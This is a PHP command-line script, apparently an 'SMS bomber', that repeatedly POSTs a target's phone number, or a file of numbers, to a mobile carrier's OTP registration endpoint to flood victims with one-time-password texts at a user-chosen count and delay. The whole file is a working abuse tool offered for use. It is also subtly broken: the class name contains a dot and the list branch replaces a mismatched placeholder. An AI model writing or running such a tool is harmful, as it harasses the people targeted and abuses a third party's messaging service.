<?php 

/**

* TEXT BOOMBER MULTI API RANDOM.

* @author H4CK3R.EMJ < h4ck3r.emj@gmail.com >

* 

*/

error_reporting(0);

Class __H4CK3R.EMJ{

	/** Add Your Api here **/

	public static $API_URL = [


		'tri' => ['url' => 'https://registrasi.tri.co.id/daftar/generateOTP',

					 'postdata' => 'msisdn={H4CK3R.EMJ_nomerHP}',

					 'success' => '"code":"200"'

					]

					];

	public static $readLine;

	public function __banner()

	{

		print

"

	+-------------- [ TEXT BOOMBER MULTI API ]

	 +-------------------------------------------[ 2019 ]

";

	}

	public function __Boom($url,$data)

	{

		$c = curl_init();

		$s = array(

			CURLOPT_URL => $url,

			CURLOPT_POST=>true,

			CURLOPT_POSTFIELDS=>$data,

			CURLOPT_RETURNTRANSFER=>true,

			CURLOPT_USERAGENT=>"Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",

			);

		curl_setopt_array($c,$s);

		return curl_exec($c);

		curl_close($c);

	}

	public function __stuck($text = "Input number / List Number")

	{

		echo PHP_EOL;

		echo "H4CK3R.EMJ:: {$text} >>";

		self::$readLine = rtrim(fgets(STDIN));

	}

	public function __rapi($text,$lenght,$isi)

	{

		return str_pad(strtoupper($text),$lenght,$isi,STR_PAD_BOTH);

	}

	public function __action()

	{

		$read = self::$readLine;

		if(preg_match("/([0-9]{10,16})/",$read))

		{

			echo "[!] Detected phone number ~ ".PHP_EOL;

			echo "[!] $read :: Targeted ~".PHP_EOL;

			

			echo PHP_EOL;

			self::__stuck('How much boom to send?');

			$boom=self::$readLine;

			self::__stuck('How much delay to proccess?');

			$delay=self::$readLine;

			for($i=1;$i<=$boom;$i++)

			{

			$api = array_rand(self::$API_URL);

			$post = str_replace("{H4CK3R.EMJ_nomerHP}",$read,self::$API_URL[$api]['postdata']);

			if(preg_match("/".self::$API_URL[$api]['success']."/",self::__Boom(self::$API_URL[$api]['url'],$post)))

			{

				echo "[$i][SUCCESS] ".self::__rapi($api,10," ")." :: $read ./H4CK3R.EMJ ".PHP_EOL;

			}else{

				echo "[$i][FAILED ] ".self::__rapi($api,10," ")." :: $read ./H4CK3R.EMJ".PHP_EOL;

			}

			sleep($delay);

			}

		}elseif(preg_match("/txt/",$read) || is_file($read))

		{

			echo "[!] Detected file list number $read ~".PHP_EOL;

			$nlist = explode(PHP_EOL,@file_get_contents($read));

			foreach($nlist as $no)

			{

				echo "[!] $no :: Targeted ~".PHP_EOL;

			}

			echo PHP_EOL;

			self::__stuck('How much boom to send?');

			$boom=self::$readLine;

			self::__stuck('How much delay to proccess?');

			$delay=self::$readLine;

			foreach($nlist as $nmr)

			{

				for($i=1;$i<=$boom;$i++)

				{

					$api = array_rand(self::$API_URL);

					$post = str_replace("{shutdown57_nomerHP}",$nmr,self::$API_URL[$api]['postdata']);

					if(preg_match("/".self::$API_URL[$api]['success']."/",self::__Boom(self::$API_URL[$api]['url'],$post)))

					{

						echo "[$i][SUCCESS] ".self::__rapi($api,10," ")." :: $nmr ./H4CK3R.EMJ ".PHP_EOL;

					}else{

						echo "[$i][FAILED ] ".self::__rapi($api,10," ")." :: $nmr ./H4CK3R.EMJ".PHP_EOL;

					}

					sleep($delay);

			}

			}

		}else{

			die('Input not correct ~'.PHP_EOL);

		}

	}

	public function __run__bom_bom()

	{

		self::__banner();

		self::__stuck();

		self::__action();

	}

}

__H4CK3R.EMJ::__run__bom_bom();

?>

